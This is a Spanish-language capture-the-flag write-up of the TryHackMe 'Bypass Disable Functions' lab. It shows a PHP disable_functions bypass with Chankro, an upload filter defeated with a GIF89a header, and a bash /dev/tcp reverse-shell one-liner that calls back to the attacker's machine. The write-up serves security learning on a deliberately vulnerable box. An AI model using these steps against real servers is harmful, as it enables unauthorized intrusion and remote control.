---
title: "Bypass Disable Functions - Try Hack Me"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/BypassDisableFunctions/data/mail.png?raw=true"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/TryHackMe.png?raw=true"
categories:
  - Writeup
  - TryHackMe
tags:
  - PHP
  - Bypassing
---

<p align="center">
<img src="https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/machines/THM/BypassDisableFunctions/data/ChankroTHM.png?raw=true">
</p>

La máquina **Bypass Disable Functions** es una máquina virtual vulnerable de la plataforma **Try Hack Me** con un nivel de dificultad **Info** desarrollada por **stuxnet** y publicada **23 de junio del 2021** cuenta con un sistema operativo **Linux**.

**URL:** [Bypass Disable Functions - TryHackMe](https://tryhackme.com/jr/bypassdisablefunctions)


## Port Scan

  Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.71.174]** utilizando los parámetros:

  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPorts   **, vemos que los puertos que destacaron en este caso fueron **22 y 80**:  

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/scan/Ports.png">
  </p>


  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/scan/PortServ.png">
  </p>

  Ya que el escaneo de versiones y servicios no mostró demasiado empezamos a enumerar un poco mas a nivel web mediante un navegador ya que cuenta con un servicio **http** por el puerto **80** y al entrar pude ver lo siguiente:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/scan/web.png">
  </p>

  Enumerando la pagina podemos ver que existe una ruta donde es posible subir archivos.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/scan/arc.png">
  </p>

## Lateral Movement

  Al enumerar la web con la herramienta de **wappalyzer** se puede ver que la web tiene como lenguaje de programación **PHP**

  <p align="center">
  <img src="https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/machines/THM/BypassDisableFunctions/scan/wap.png?raw=true">
  </p>

  Con esto en mete podemos ver que el archivo **phpinfo.php** esta disponible, esté archivo sirve para poder ver información acerca de como que tanto nos interpretara un archivo **php** en la web:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/scan/phpi.png">
  </p>


  Viendo la información que nos brinda el **phpinfo** podemos ver un apartado llamado **disable_funtions** y en ella están seteadas muchas variables criticas como:
  - exec
  - passthru
  - shell_exec
  - system
  - proc_open
  - popen
  - curl_exec
  - curl_multi_exec

  Al podemos ver que estamos muy limitados a la hora de subir un archivo **php** el cual contenga código malicioso a nuestro beneficio pero investigando y gracias a la información que nos brinda esta maquina podemos hacer uso de la herramienta **[Chankro](https://github.com/TarlogicSecurity/Chankro)**.

  Esta herramienta nos permite ejecutar comando mediante la función **mail()** y **putenv()**. Una explicación de lo que hace es a bajo nivel lo explican bien en este **[articulo](https://www.tarlogic.com/blog/evadir-disable_functions-open_basedir/)**.

  Para probar si la herramienta funciona vamos a ejecutar un **whoami** y depositar lo en la ruta absoluta de la web, la cual se alojan en **/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/** esto se sabe ya que ene le **phpinfo** se puede ver la ruta en donde esta alojada la web.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/info.png">
  </p>

  Para hacer esto voy a crear un archivo llamado **command.sh** y con el siguiente contenido:

  ```bash
  #!/bin/bash

  whoami > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/winsad.txt

  ```
  Ya creado esto hare uso de la herramienta **Chankro** con los siguientes parámetros:

  - **--arch 64**             (Architecture 32 or 64.)  
  - **--input command.sh**    (Binario a ejecutar.)
  - **--output winsad.php**   (Nombre del PHP a crear.)
  - **--path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db**  (Ruta a donde se aloja el binario creado.)

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/cha1.png">
  </p>

  Una vez creado la herramienta nos crea el  archivo **php** ire a la web y lo subo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/web1.png">
  </p>

  Cuando lo subo puedo ver que me marca error y eso sucede ya que la pagina tiene una validación la cual solo permite subir imágenes y para **bypassear** esta validación puedo agregar a el archivo **php** el **magic number** de un **GIF** el cual tiene un valor ```GIF89a;```:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/cha2.png">
  </p>

  Agregándole esta cabecera estamos indicando que los primero bits del archivo se identifica como un **GIF** y si hago un **file** puedo ver que efectivamente toma que el archivo es un **GIF** aunque tenga extension **php**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/file.png">
  </p>

  Si volvemos a subir el archivo podemos ver que ahora si nos permitió subir el archivo:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/web2.png">
  </p>

  Si buscamos en la web podemos ver que existe un subdirectorio **uploads** en donde se almacenan los archivos que subimos:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/web3.png">
  </p>

  Si entramos a nuestro archivo podemos ver que el código en php lo interpreta y según las instrucciones a la hora de interpretarlo debería crear nuestro archivo en la raíz el cual indicamos que se llama **"winsad.txt"** y si vamos vemos que efectivamente el archivo existe:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/web4.png">
  </p>

## Gaining Access

  Ahora que podemos ver que se pueden ejecutar comando a nivel de sistema modificare el archivo **command.sh** y agregare código que cuando se ejecute me entable una revershell a mi maquina por el puerto 443:

  ```bash
  #!/bin/bash

  bash -c 'bash -i >& /dev/tcp/[My IP]/443 0>&1'
  ```

  Con esto en mente y ya modificado el archivo **command.sh** vuelvo a crear el archivo **winsad.php** con **Chankro** y ya creado vuelvo a agregar la cabecera **'GIF89a;'** y a subir el archivo.


  Ya que volví a subir el **php** y yendo a la ruta donde esta alojado **winsad.php** puedo ver que me interpreta el código y me otorga la **shell**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/shell.png">
  </p>

  Ya dentro de la maquina podemos ir la directorio del usuario **s4vi** y visualizar la flag.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/BypassDisableFunctions/intrusion/flag.png">
  </p>
